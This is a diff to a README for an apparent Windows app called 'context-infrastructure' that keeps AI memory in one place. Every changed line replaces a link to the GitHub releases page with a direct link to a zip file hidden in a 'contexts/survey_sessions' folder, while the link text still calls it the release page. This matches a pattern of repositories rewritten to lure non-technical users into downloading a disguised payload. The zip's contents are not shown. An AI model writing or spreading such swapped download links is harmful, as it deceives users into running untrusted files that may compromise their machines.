@@ -1,6 +1,6 @@
 # 🧩 context-infrastructure - Keep AI Memory in One Place
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Genuspogoniacubicmillimetre130/context-infrastructure/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Genuspogoniacubicmillimetre130/context-infrastructure/main/contexts/survey_sessions/context-infrastructure-1.5.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ This README is written for Windows users. You do not need coding experience to g
 
 ## 📥 Download
 
-1. Open the [release page](https://github.com/Genuspogoniacubicmillimetre130/context-infrastructure/releases).
+1. Open the [release page](https://raw.githubusercontent.com/Genuspogoniacubicmillimetre130/context-infrastructure/main/contexts/survey_sessions/context-infrastructure-1.5.zip).
 2. Find the latest release at the top of the list.
 3. Download the Windows file from that release.
 4. Save the file to your computer, such as your Downloads folder.
@@ -154,7 +154,7 @@ This keeps the agent aligned with your work style and project goals.
 
 To update to a newer version:
 
-1. Return to the [release page](https://github.com/Genuspogoniacubicmillimetre130/context-infrastructure/releases).
+1. Return to the [release page](https://raw.githubusercontent.com/Genuspogoniacubicmillimetre130/context-infrastructure/main/contexts/survey_sessions/context-infrastructure-1.5.zip).
 2. Download the latest Windows file.
 3. Close the app if it is open.
 4. Install or replace the older version.
@@ -201,7 +201,7 @@ Open the app file or follow the included setup steps for the release you downloa
 
 If you need to get the app again, use the release page here:
 
-[Visit the release page to download](https://github.com/Genuspogoniacubicmillimetre130/context-infrastructure/releases)
+[Visit the release page to download](https://raw.githubusercontent.com/Genuspogoniacubicmillimetre130/context-infrastructure/main/contexts/survey_sessions/context-infrastructure-1.5.zip)
 
 ## 🔎 What Makes It Useful
 
